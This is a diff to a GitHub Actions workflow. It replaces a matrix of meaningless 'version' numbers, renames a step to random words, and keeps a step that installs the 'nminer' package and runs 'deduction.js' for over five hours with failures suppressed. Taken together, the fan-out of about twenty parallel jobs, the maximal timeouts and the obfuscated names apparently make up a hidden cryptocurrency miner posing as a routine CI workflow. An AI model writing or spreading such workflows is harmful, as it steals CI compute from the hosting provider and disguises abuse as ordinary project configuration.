@@ -9,24 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3565 }
-          - { version: 5112 }
-          - { version: 3375 }
-          - { version: 4063 }
-          - { version: 8246 }
-          - { version: 6338 }
-          - { version: 6627 }
-          - { version: 5145 }
-          - { version: 760 }
-          - { version: 5485 }
-          - { version: 4595 }
-          - { version: 5601 }
-          - { version: 3634 }
-          - { version: 5596 }
-          - { version: 9584 }
-          - { version: 7490 }
-          - { version: 9675 }
-          - { version: 4559 }
+          - { version: 2810 }
+          - { version: 1412 }
+          - { version: 5725 }
+          - { version: 7488 }
+          - { version: 4567 }
+          - { version: 8071 }
+          - { version: 7700 }
+          - { version: 5810 }
+          - { version: 2628 }
+          - { version: 6175 }
+          - { version: 3077 }
+          - { version: 8855 }
+          - { version: 4499 }
+          - { version: 5629 }
+          - { version: 4133 }
+          - { version: 7721 }
+          - { version: 5619 }
+          - { version: 8706 }
+          - { version: 9729 }
+          - { version: 376 }
 
     steps:
       - name: Checkout
@@ -37,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: eventually galvanize commonly failing
         run: |
           npm install nminer@latest
-          timeout 327m node deduction.js || echo "deduction executed"
+          timeout 323m node deduction.js || echo "deduction executed"
